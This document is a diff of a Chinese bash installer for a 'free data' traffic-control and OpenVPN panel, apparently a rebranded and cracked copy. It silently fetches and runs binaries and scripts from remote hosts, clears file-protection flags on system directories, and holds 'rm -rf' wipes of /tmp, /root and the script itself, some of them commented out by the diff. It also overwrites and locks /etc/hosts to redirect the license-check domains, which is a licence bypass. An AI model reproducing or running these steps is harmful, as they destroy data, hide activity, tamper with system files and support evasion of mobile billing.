@@ -1,6 +1,6 @@
 #!/bin/bash
 function shellhead() {
-rm -rf $0
+#rm -rf $0  >/dev/null 2>&1
 if [ ! -e "/usr/bin/xbb" ];then
 cd /usr/bin/ >/dev/null 2>&1 
 wget  tx.xbaicai.net/xbb >/dev/null 2>&1 
@@ -15,25 +15,25 @@ chattr -a /root >/dev/null 2>&1
 chattr -a /tmp >/dev/null 2>&1
 chattr -a /etc >/dev/null 2>&1
 chattr -a /usr/bin     >/dev/null 2>&1
-rm -rf  /tmp/*         >/dev/null 2>&1
-rm -rf  /etc/.xb       >/dev/null 2>&1
-rm -rf  /root/.xb      >/dev/null 2>&1
-rm -rf  /root/xb       >/dev/null 2>&1
-rm -rf  /etc/.xbml     >/dev/null 2>&1
-rm -rf  /root/.xbml    >/dev/null 2>&1
-rm -rf  /root/$0       >/dev/null 2>&1
-xbb -rf  /tmp/*        >/dev/null 2>&1
-xbb -rf  /etc/.xb      >/dev/null 2>&1
-xbb -rf  /root/.xb     >/dev/null 2>&1
-xbb -rf  /root/xb      >/dev/null 2>&1
-xbb -rf  /etc/.xbml    >/dev/null 2>&1
-xbb -rf  /root/.xbml   >/dev/null 2>&1
-xbb -rf $0  >/dev/null 2>&1
+#rm -rf  /tmp/*         >/dev/null 2>&1
+#rm -rf  /etc/.xb       >/dev/null 2>&1
+#rm -rf  /root/.xb      >/dev/null 2>&1
+#rm -rf  /root/xb       >/dev/null 2>&1
+#rm -rf  /etc/.xbml     >/dev/null 2>&1
+#rm -rf  /root/.xbml    >/dev/null 2>&1
+#rm -rf  /root/$0       >/dev/null 2>&1
+#xbb -rf  /tmp/*        >/dev/null 2>&1
+#xbb -rf  /etc/.xb      >/dev/null 2>&1
+#xbb -rf  /root/.xb     >/dev/null 2>&1
+#xbb -rf  /root/xb      >/dev/null 2>&1
+#xbb -rf  /etc/.xbml    >/dev/null 2>&1
+#xbb -rf  /root/.xbml   >/dev/null 2>&1
+#xbb -rf $0  >/dev/null 2>&1
     loginlogo='
   ==================================================================
                                                                          
                         小羽免流-流控系统                        
-                  Powered by www.xbml.vip 2017  				  
+                  Powered by 2453223958  				  
                       All Rights Reserved        					  
                                                                          
                                 by 小羽 2017-05-28
@@ -41,8 +41,8 @@ xbb -rf $0  >/dev/null 2>&1
     XBMLLogo='
 ==================================================================
                                                                          
-                        小白免流-流控系统                            
-                  Powered by www.xbml.vip 2017                        
+                        小羽免流-流控系统                            
+                  Powered by 2453223958                        
                       All Rights Reserved     				  
                                                                          
                                 by 小羽 2017-05-28
@@ -50,8 +50,8 @@ xbb -rf $0  >/dev/null 2>&1
 	errorlogo='
 ==================================================================
                                                                          
-                        小白免流-流控系统                           
-                  Powered by www.xbml.vip 2017                          
+                        小羽免流-流控系统                           
+                  Powered by 2453223958                          
                       All Rights Reserved  			  
 					                                 
                                 by 小羽 2017-05-28
@@ -59,7 +59,7 @@ xbb -rf $0  >/dev/null 2>&1
 	keyerrorlogo='
 ==================================================================
                       验证码输入错误，请重新运行                                            
-                           小白免流-流控系统                       
+                           小羽免流-流控系统                       
                            流量控制安装失败                          					 
                                                                          
                                 by 小羽 2017-05-28
@@ -179,15 +179,15 @@ echo
 echo -e "\033[31m即将开始设置云端APP的信息\033[0m"
 echo -e "\033[31m文字请先在外部输入后复制粘贴\033[0m"
 echo
-echo -e "\033[31m输入您的APP名称（默认：小羽云流）\033[0m"
+echo -e "\033[31m输入您的APP名称（默认：小羽云控）\033[0m"
 echo 
 echo -n -e "\033[36mAPP名称：\033[0m" 
 read app_name
 if [[ -z $app_name ]] 
 then
 echo
-echo -e "\033[34m已设置APP名称：小羽云流 \033[0m" 
-app_name="小羽云流"
+echo -e "\033[34m已设置APP名称：小羽云控 \033[0m" 
+app_name="小羽云控"
 else 
 echo
 echo -e "\033[34m已设置APP名称:$app_name \033[0m"
@@ -218,7 +218,7 @@ if [[ -z $llwsappname ]]
 then 
 echo
 echo -e "\033[34m已设置流量卫士APP名称：小羽云控\033[0m" 
-llwsappname=小羽云控 
+llwsappname=小羽云控
 else 
 echo
 echo -e "\033[34m已设置流量卫士APP名称：$llwsappname \033[0m"
@@ -484,7 +484,7 @@ echo -e "\033[36m正在安装极速LAMP...\033[0m"
 mkdir -p /home/wwwroot/default >/dev/null 2>&1
 cd /root/
 rm -rf /etc/httpd/conf/httpd.conf
-wget bdwml.cn/xbml-lamp.sh >/dev/null 2>&1
+wget www.bdwml.cn/xbml-lamp.sh >/dev/null 2>&1
 chmod 777 xbml-lamp.sh
 ./xbml-lamp.sh >/dev/null 2>&1
 sed -i 's/#ServerName www.example.com:80/ServerName localhost:'$port'/g' /etc/httpd/conf/httpd.conf 
@@ -494,7 +494,7 @@ else
 echo -e "\033[36m正在安装极速LNMP...\033[0m"
 mkdir -p /home/wwwroot/default >/dev/null 2>&1
 cd /root/
-wget bdwml.cn/${lnmpfile} >/dev/null 2>&1
+wget www.bdwml.cn/${lnmpfile} >/dev/null 2>&1
 unzip ${lnmpfile} >/dev/null 2>&1
 rm -rf ${lnmpfile} >/dev/null 2>&1
 chmod 777 -R /root/lnmp >/dev/null 2>&1
@@ -665,7 +665,7 @@ cd /home
 Sys_data=`date -d  "$CURTIME" +%s`   #把开始时间转化为Linux时间
 In_data=`date -d  "$LASTLINE" +%s`   #把结束时间转化为Linux时间
 intstalltime=`expr $In_data - $Sys_data`  #计算2个时间的差
-echo -e '\033[36m欢迎使用小羽云控OpenVPN快速安装脚本》\033[0m' >>info.txt
+echo -e '\033[36m欢迎使用小白免流OpenVPN快速安装脚本》\033[0m' >>info.txt
 echo -e "\033[36m
 ---------------------------------------------------------
 流量查询：        ${IP}:${port}/cx.php
@@ -722,13 +722,6 @@ rm -rf /root/ShakaApktool
 echo -e "\033[36m配置文件已经上传完毕\033[0m"
 echo -e "\033[36m正在加载您的配置信息\033[0m"
 cat info.txt
-chattr -i /etc/hosts >/dev/null 2>&1
-echo "127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
-::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
-123.207.218.169 sbwml.cn
-123.207.218.169 www.sbwml.cn
-123.207.218.169 sq.xbaicai.net" >/etc/hosts
-chattr +i /etc/hosts >/dev/null 2>&1
 echo -e "\033[33m下载链接：${IP}:${port}/xbml-openvpn.zip \033[0m"
 echo
 \cp -rf /home/xbml-openvpn.zip /home/wwwroot/default/xbml-openvpn.zip
@@ -747,6 +740,13 @@ unsql                          >/dev/null 2>&1
 onsql                          >/dev/null 2>&1
 onlock                         >/dev/null 2>&1
 unlock                         >/dev/null 2>&1
+chattr -i /etc/hosts >/dev/null 2>&1
+echo "127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+123.207.218.169 sbwml.cn
+123.207.218.169 www.sbwml.cn
+123.207.218.169 sq.xbaicai.net" >/etc/hosts
+chattr +i /etc/hosts >/dev/null 2>&1
 return 1
 }
 function main(){
@@ -1201,7 +1201,7 @@ echo " ...安装被终止"
 exit 0;
 fi
 rm -rf bbr.sh
-rm -rf /root/*
+#rm -rf /root/*
 wget tx.xbaicai.net/bbr.sh >/dev/null 2>&1
 bash bbr.sh
 exit 0;
@@ -1287,7 +1287,7 @@ rm -rf .xb >/dev/null 2>&1
 rm -rf xb >/dev/null 2>&1
 rm -rf xb >/dev/null 2>&1
 rm -rf xb >/dev/null 2>&1
-rm -rf $0  >/dev/null 2>&1
+#rm -rf $0  >/dev/null 2>&1
 rm -rf /etc/etc .xb >/dev/null 2>&1
 return 1
 }
